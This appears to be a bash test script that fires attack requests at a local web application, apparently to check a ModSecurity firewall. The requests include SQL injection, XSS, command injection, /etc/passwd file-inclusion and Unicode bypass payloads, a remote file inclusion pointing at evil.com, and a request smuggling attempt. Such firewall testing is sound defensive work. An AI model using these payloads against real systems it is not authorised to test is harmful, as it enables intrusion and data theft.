#!/bin/bash

BASE_URL="https://localhost:8443"
OUTPUT_DIR="./modsec_test_results"

mkdir -p "$OUTPUT_DIR"

function test_request() {
  local desc="$1"
  local curl_cmd="$2"
  local filename="$3"

  echo "=== Test: $desc ==="
  http_code=$(eval "$curl_cmd -k -w \"%{http_code}\" -o \"$OUTPUT_DIR/$filename\"")
  echo "HTTP status: $http_code"
  echo "Response saved to $OUTPUT_DIR/$filename"
  echo -e "\n-----------------------------\n"
}

# /api/register
test_request "SQL Injection (POST) on /api/register" \
  "curl -s -X POST -d \"username=admin%27--&password=test\" \"$BASE_URL/api/register\"" \
  "register_sqli_post.html"

test_request "XSS (POST) on /api/register" \
  "curl -s -X POST -d \"username=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&password=test\" \"$BASE_URL/api/register\"" \
  "register_xss_post.html"

test_request "Command Injection (POST) on /api/register" \
  "curl -s -X POST -d \"username=admin;ls&password=test\" \"$BASE_URL/api/register\"" \
  "register_cmd_injection_post.html"

# /api/login
test_request "XSS (GET) on /api/login" \
  "curl -s \"$BASE_URL/api/login?redirect=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\"" \
  "login_xss_get.html"

test_request "SQL Injection (GET) on /api/login" \
  "curl -s \"$BASE_URL/api/login?user=admin%27%20OR%20%271%27%3D%271\"" \
  "login_sqli_get.html"

test_request "Empty User-Agent on /api/login" \
  "curl -s -H \"User-Agent:\" \"$BASE_URL/api/login\"" \
  "login_empty_user_agent.html"

# /api/auth/google
test_request "Remote File Inclusion (RFI) on /api/auth/google" \
  "curl -s \"$BASE_URL/api/auth/google?file=http%3A%2F%2Fevil.com%2Fmalicious.txt\"" \
  "google_rfi.html"

test_request "HTTP Request Smuggling attempt on /api/auth/google" \
  "curl -s -X POST \"$BASE_URL/api/auth/google\" -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' -d '0\r\n\r\n'" \
  "google_http_smuggling.html"

# /api/auth/google/callback
test_request "Local File Inclusion (LFI) on /api/auth/google/callback" \
  "curl -s \"$BASE_URL/api/auth/google/callback?file=..%2F..%2Fetc%2Fpasswd\"" \
  "google_callback_lfi.html"

test_request "Unicode LFI bypass on /api/auth/google/callback" \
  "curl -s \"$BASE_URL/api/auth/google/callback?file=..%25c0%25af..%25c0%25afetc%2Fpasswd\"" \
  "google_callback_unicode_lfi.html"

test_request "Cross-Site Scripting (XSS) on /api/auth/google/callback" \
  "curl -s \"$BASE_URL/api/auth/google/callback?param=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\"" \
  "google_callback_xss.html"

test_request "SQL Injection (GET) on /api/auth/google/callback" \
  "curl -s \"$BASE_URL/api/auth/google/callback?code=abc%27%20OR%20%271%27%3D%271\"" \
  "google_callback_sqli_get.html"

# /profile
test_request "SQL Injection (GET) on /profile" \
  "curl -s \"$BASE_URL/profile?user=admin%27%20OR%20%271%27%3D%271\"" \
  "profile_sqli_get.html"

test_request "XSS (GET) on /profile" \
  "curl -s \"$BASE_URL/profile?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\"" \
  "profile_xss_get.html"

# /refresh
test_request "SQL Injection (POST) on /refresh" \
  "curl -s -X POST -d \"token=abc%27%20OR%20%271%27%3D%271\" \"$BASE_URL/refresh\"" \
  "refresh_sqli_post.html"

test_request "Empty User-Agent on /refresh" \
  "curl -s -H \"User-Agent:\" \"$BASE_URL/refresh\"" \
  "refresh_empty_user_agent.html"

# /2fa
test_request "Command Injection (POST) on /2fa" \
  "curl -s -X POST -d \"code=123;ls\" \"$BASE_URL/2fa\"" \
  "2fa_cmd_injection_post.html"

test_request "XSS (POST) on /2fa" \
  "curl -s -X POST -d \"code=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\" \"$BASE_URL/2fa\"" \
  "2fa_xss_post.html"

# /settings
test_request "Local File Inclusion (LFI) on /settings" \
  "curl -s \"$BASE_URL/settings?config=..%2F..%2Fetc%2Fpasswd\"" \
  "settings_lfi.html"

test_request "SQL Injection (GET) on /settings" \
  "curl -s \"$BASE_URL/settings?mode=normal%27%20OR%20%271%27%3D%271\"" \
  "settings_sqli_get.html"

# /
test_request "Cross-Site Scripting (XSS) on /" \
  "curl -s \"$BASE_URL/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E\"" \
  "root_xss.html"

test_request "Empty User-Agent on /" \
  "curl -s -H \"User-Agent:\" \"$BASE_URL/\"" \
  "root_empty_user_agent.html"

echo "All tests completed. Check $OUTPUT_DIR for responses."
